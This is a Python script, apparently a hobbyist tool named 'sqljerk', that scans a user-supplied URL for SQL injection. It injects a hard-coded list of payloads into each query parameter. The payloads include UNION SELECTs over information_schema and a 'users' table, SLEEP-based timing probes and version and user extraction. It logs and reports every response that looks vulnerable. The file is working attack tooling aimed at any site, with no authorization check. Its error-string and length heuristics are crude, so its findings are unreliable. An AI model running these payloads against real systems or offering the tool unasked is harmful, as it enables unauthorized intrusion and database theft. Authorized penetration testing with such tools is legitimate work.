# sqljerk.py
# made in Tbilisian Coder

import requests
import re
import os
from urllib.parse import urlencode, urlparse, parse_qs
from termcolor import colored

def initialize_log_file():
    """Create or clear the log file at the start of the program."""
    with open("sqljerk_log.txt", "w") as log_file:
        log_file.write("SQLJerk Log File\n====================\n")

def log_request_response(test_url, response):
    """Log the test URL and response for debugging."""
    with open("sqljerk_log.txt", "a") as log_file:
        log_file.write(f"\n[URL] {test_url}\n")
        log_file.write(f"[Response Code] {response.status_code}\n")
        log_file.write(f"[Response Length] {len(response.text)}\n")
        log_file.write("[Response Content]\n")
        log_file.write(response.text[:500] + ("...\n" if len(response.text) > 500 else "\n"))
        
    print(f"[LOG] Request URL: {test_url}")
    print(f"[LOG] Response Code: {response.status_code}")
    print(f"[LOG] Response Length: {len(response.text)}")
    print(f"[LOG] Response Content: {response.text[:500]}...")

def check_sql_injection(url):
    """Check if a URL is vulnerable to SQL injection."""
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    if not query_params:
        print(colored("[!] No query parameters found in the URL.", "red"))
        return

    payloads = [
        "'", '"', "' OR 1=1--", '" OR 1=1--', "' AND 1=2--", '" AND 1=2--',
        "1' AND '1'='1", "1\" AND \"1\"=\"1\"", "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3--", "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS INT)--",
        "' AND 1=CAST((SELECT version()) AS INT)--",
        "' AND 1=1--", "' AND 1=2--", "' OR EXISTS(SELECT 1)--",
        "' OR SLEEP(5)--", "' AND SLEEP(5)--", "' OR pg_sleep(5)--",
        "'/**/OR/**/1=1--", "' OR '1'='1'/*", "' OR 'abc'='a'+'b'+'c'--",
        "' AND @@version--", "' AND user()--", "' OR database()--", "' AND current_user--",
        "' AND pg_catalog.version()--", "' AND current_user--"
    ]

    is_vulnerable = False

    for param in query_params:
        for payload in payloads:
            test_params = query_params.copy()
            test_params[param] = payload

            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params, doseq=True)}"
            print(f"[DEBUG] Testing URL: {test_url}") 

            try:
                response = requests.get(test_url, timeout=5)
                log_request_response(test_url, response)

                if any(error in response.text.lower() for error in [
                    "mysql", "syntax error", "sql", "warning: unrecognized token", "unclosed quotation mark", "near"
                ]):
                    print(colored(f"[!] Possible SQL injection vulnerability detected: {test_url}", "red"))
                    print(colored(f"    Payload: {payload}", "yellow"))
                    is_vulnerable = True

                test_url_valid = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode({param: '1'}, doseq=True)}"
                response_valid = requests.get(test_url_valid, timeout=5)
                log_request_response(test_url_valid, response_valid)

                if len(response.text) != len(response_valid.text):
                    print(colored(f"[!] Potential SQL injection based on response difference: {test_url}", "red"))
                    print(colored(f"    Payload: {payload}", "yellow"))
                    is_vulnerable = True

            except requests.RequestException as e:
                print(colored(f"[!] Error occurred: {e}", "red"))
                with open("sqljerk_log.txt", "a") as log_file:
                    log_file.write(f"[ERROR] {str(e)}\n")

    if not is_vulnerable:
        print(colored("[+] No SQL injection vulnerabilities found.", "green"))

    return is_vulnerable

def main():
    initialize_log_file()
    print(colored("SQL Injection Scanner\nMade in Tbilisian Coder\n", "red"))

    url = input(colored("Enter the target URL (with parameters): ", "red")).strip()
    if not url:
        print(colored("[!] No URL provided. Exiting.", "red"))
        return

    print(colored(f"[+] Checking URL: {url}", "red"))
    check_sql_injection(url)

if __name__ == "__main__":
    main()
